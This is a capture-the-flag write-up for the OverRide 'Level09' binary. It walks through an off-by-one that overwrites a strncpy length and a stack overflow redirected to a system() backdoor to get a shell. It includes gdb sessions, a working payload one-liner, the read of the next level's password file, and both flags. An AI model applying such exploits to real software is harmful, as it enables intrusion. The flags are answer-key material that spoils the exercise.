[README](../README.md)
# Level09
previous flag: `fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S`

## Behavior
- when eecuting the program we are prompt to enter 
    - a username
    - a message
- a msg sent confirmation is displayed before returning

## disas 
- main call handle_msg
- handle_msg 
    - handle both the username and the msg logic, calling set_username at <+80> and set_msg at <+95>
    - allocates 192 bytes on the stack (`0x00000000000008c4 <+4>:	sub    $0xc0,%rsp`) that we will find out being split in 140 char for the message, 40 char for the username and  4 byes for the int containing the size
    - contains a struct declaration:
        - 5 * 8 bytes = 40 char (for the username)
        ```
        0x00000000000008d8 <+24>:	movq   $0x0,(%rax)
        0x00000000000008df <+31>:	movq   $0x0,0x8(%rax)
        0x00000000000008e7 <+39>:	movq   $0x0,0x10(%rax)
        0x00000000000008ef <+47>:	movq   $0x0,0x18(%rax)
        0x00000000000008f7 <+55>:	movq   $0x0,0x20(%rax)
        ```

        - `0x00000000000008ff <+63>:	movl   $0x8c,-0xc(%rbp)`:  an integer being initialized to a value of 140 (the max length of text being used in set_msg)
        - 192-4(align)-40(username)-4(text_length) = 140 char => text array
- set_username has a vulnerability related to a wrong loop limit that can reach 41 (if there is no NULL terminator) for a buffer that is 40 bytes long (from <+121> to <+178>) => test instruction at <+176> checks if the value in al register is zero
- set_msg copy using strncpy the text written by the user into the buffer using the length var as ref
- secret_backdoor does nothing but executing the system() function with whatever argument is passed to it



## vulnerability
- if we pass an username of 41 bytes istead of 40 we can write directly in the text length var (set in handle_msg to 140 and controlling the strncpy used in set_msg => msg must be 140 char max long)
- if we write in the text length var a value higher than 140, the strncpy iin set_msg overflows giving us the way to call the secret_bckdoor function that execute whatever we pass to it

## Solution
- we write a padding of 40 char to overflow the loop and write to text length
- we write to text length var the value \xff; that is the highest value we can write in a un unsigned char
- find the secret_backdoor address: 
```
(gdb) info function secret_backdoor
All functions matching regular expression "secret_backdoor":

Non-debugging symbols:
0x000055555555488c  secret_backdoor
```
- find the offset of strncpy overflowed :
```
(gdb) shell python -c 'print "A" * 40 + "\xff" + "\n" + "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2A"' > /tmp/exp
(gdb) run < /tmp/exp
Program received signal SIGSEGV, Segmentation fault.
0x0000555555554931 in handle_msg ()
(gdb) info registers
rax            0xd	13
rbx            0x0	0
rcx            0x7ffff7b01f90	140737348902800
rdx            0x7ffff7dd5a90	140737351867024
rsi            0x7ffff7ff7000	140737354100736
rdi            0xffffffff	4294967295
rbp            0x6741356741346741	0x6741356741346741
rsp            0x7fffffffe1a8	0x7fffffffe1a8
r8             0x7ffff7ff7004	140737354100740
r9             0xc	12
r10            0x7fffffffda50	140737488345680
r11            0x246	582
r12            0x555555554790	93824992233360
r13            0x7fffffffe290	140737488347792
r14            0x0	0
r15            0x0	0
rip            0x555555554931	0x555555554931 <handle_msg+113>
eflags         0x10246	[ PF ZF IF RF ]
cs             0x33	51
ss             0x2b	43
ds             0x0	0
es             0x0	0
fs             0x0	0
gs             0x0	0
(gdb) x/s $rsp
0x7fffffffe1a8:	 "6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2A\n"
(gdb) x/10xw $rsp
0x7fffffffe1a8:	0x37674136	0x41386741	0x68413967	0x31684130
0x7fffffffe1b8:	0x41326841	0x68413368	0x35684134	0x41366841
0x7fffffffe1c8:	0x68413768	0x39684138
```
=> if we pass 0x37674136 to the pattern generator offset finder we get 200 as the offset
- add the /bin/bash code at the end of the payload:

## crafting the payload
- `(python -c 'print "A" * 40 + "\xff" + "\n" + "B" * 200 + "\x8c\x48\x55\x55\x55\x55\x00\x00" + "\n" + "/bin/sh\n"'; cat) | ./level09`

```
level09@OverRide:~$ (python -c 'print "A" * 40 + "\xff" + "\n" + "B" * 200 + "\x8c\x48\x55\x55\x55\x55\x00\x00" + "\n" + "/bin/sh\n"'; cat) | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: >: Msg sent!
whoami
end
cat /home/users/end/.pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
```


